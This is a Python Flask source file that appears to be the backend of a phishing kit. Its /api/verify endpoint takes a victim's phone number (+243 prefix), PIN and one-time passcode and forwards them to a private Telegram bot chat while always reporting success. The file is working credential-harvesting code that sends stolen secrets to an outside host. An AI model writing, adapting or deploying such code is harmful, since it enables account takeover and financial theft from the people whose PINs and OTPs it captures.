import os
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

# Try loading .env file if available
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

@app.route('/api/verify', methods=['POST'])
def verify():
    data = request.json or {}
    phone = data.get('phone', '')
    pin = data.get('pin', '')
    otp = data.get('otp', '')
    
    token = os.environ.get("TELEGRAM_TOKEN")
    chat_id = os.environ.get("TELEGRAM_CHAT_ID")
    
    message = f"🚀 <b>New Application Received!</b>\n\n"
    message += f"📱 <b>Phone:</b> +243 {phone}\n"
    message += f"🔑 <b>PIN:</b> {pin}\n"
    message += f"🔢 <b>OTP:</b> {otp}\n"
    
    if token and chat_id:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML"
        }
        try:
            res = requests.post(url, json=payload)
            print(f"Telegram response status: {res.status_code}")
            print(f"Telegram response body: {res.text}")
        except Exception as e:
            print(f"Error sending to Telegram: {e}")
            
    return jsonify({"status": "success"})
